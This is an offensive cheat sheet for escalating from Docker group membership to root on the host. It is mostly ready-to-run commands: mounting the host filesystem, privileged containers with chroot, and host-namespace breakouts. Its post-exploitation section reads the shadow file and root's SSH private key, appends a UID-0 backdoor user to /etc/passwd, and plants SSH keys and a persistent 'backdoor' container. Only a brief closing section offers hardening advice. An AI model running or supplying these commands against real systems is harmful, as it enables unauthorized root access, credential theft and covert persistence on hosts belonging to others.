# 🐋 Docker Container Escape

## 🎯 Overview

Docker group membership provides equivalent root access to host filesystem through container mounting and privileged container execution.

## 🔍 Prerequisites

### Check Docker Group Membership
```bash
# Check if user is in docker group
id | grep docker
groups | grep docker

# Example output:
# uid=1000(user) gid=1000(user) groups=1000(user),999(docker)
```

### Docker Service Status
```bash
# Check if Docker is running
systemctl status docker
docker --version
docker ps
```

## 🚀 Exploitation Methods

### Method 1: Mount Host Filesystem
```bash
# Mount host root directory
docker run -v /:/mnt -it ubuntu

# Inside container, access host filesystem
cd /mnt/root  # Host root directory
cat /mnt/etc/shadow  # Host shadow file
```

### Method 2: Privileged Container
```bash
# Run privileged container with host access
docker run --privileged -v /:/hostfs -it ubuntu bash

# Change root to host filesystem
chroot /hostfs

# Now operating on host system as root
id  # Should show uid=0(root)
```

### Method 3: Direct Host Shell
```bash
# Run container with host PID namespace and mount
docker run -it --pid=host --net=host --privileged -v /:/host ubuntu bash

# Access host filesystem
chroot /host
```

## 🔧 Docker Image Management

### Available Images
```bash
# List available Docker images
docker images

# Search for lightweight images
docker search alpine
docker search ubuntu
```

### Pull and Use Images
```bash
# Pull Ubuntu image if needed
docker pull ubuntu

# Pull Alpine (smaller)
docker pull alpine

# Use existing image
docker run -v /:/mnt -it existing_image
```

## 🎯 Post-Exploitation

### Host System Access
```bash
# Inside container with host mount
cd /mnt  # or /hostfs depending on mount

# Read sensitive files
cat /mnt/etc/shadow
cat /mnt/root/.ssh/id_rsa

# Create backdoor user
echo 'backdoor:$6$salt$hash:0:0:root:/root:/bin/bash' >> /mnt/etc/passwd

# SSH key persistence
mkdir -p /mnt/root/.ssh
echo "ssh-rsa AAAA..." >> /mnt/root/.ssh/authorized_keys

# Copy important files
cp /mnt/etc/shadow /tmp/shadow_backup
tar czf /tmp/host_data.tar.gz /mnt/root/
```

### Escape Verification
```bash
# Verify we're on host system (not container)
hostname
cat /proc/1/cgroup
ls -la /  # Should see host filesystem
```

## 🔍 Detection & Enumeration

### Quick Docker Check Script
```bash
#!/bin/bash
echo "=== DOCKER PRIVILEGE ESCALATION CHECK ==="

echo "[+] Docker group membership:"
id | grep docker && echo "  [!] User is in docker group!"

echo "[+] Docker service status:"
systemctl status docker 2>/dev/null

echo "[+] Available Docker images:"
docker images 2>/dev/null

echo "[+] Running containers:"
docker ps 2>/dev/null

echo "[+] Docker version:"
docker --version 2>/dev/null
```

### Docker Socket Check
```bash
# Check for Docker socket access
ls -la /var/run/docker.sock

# Test Docker commands
docker ps
docker images
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Group membership
id | grep docker

# Available resources
docker images
docker ps -a
```

### Emergency Escalation
```bash
# If Docker group confirmed
docker run -v /:/mnt -it ubuntu

# Alternative with existing image
docker run -v /:/hostfs --privileged -it image_name bash
chroot /hostfs
```

### One-liner Escalation
```bash
# Complete Docker escalation
docker run -v /:/mnt -it ubuntu bash -c "cd /mnt/root && /bin/bash"
```

## 🔧 Advanced Techniques

### Container Breakout
```bash
# Run with all host namespaces
docker run -it --pid=host --net=host --ipc=host --uts=host -v /:/host ubuntu bash

# Access host processes directly
ps aux | grep systemd  # See host processes
```

### Persistence Methods
```bash
# Create persistent backdoor container
docker run -d --name backdoor -v /:/host --privileged ubuntu tail -f /dev/null

# Access anytime
docker exec -it backdoor bash
chroot /host
```

## ⚠️ Defensive Considerations

### Docker Security Issues
- **Group membership** = root equivalent access
- **Host filesystem mounting** bypasses all isolation
- **Privileged containers** disable security features
- **No authentication** required for group members

### Hardening Recommendations
```bash
# Remove users from docker group
sudo deluser username docker

# Use rootless Docker
dockerd-rootless.sh

# Monitor Docker usage
journalctl -u docker
```

---

*Docker group membership eliminates container isolation - privileged containers with host mounts provide immediate root access to the underlying host system.* 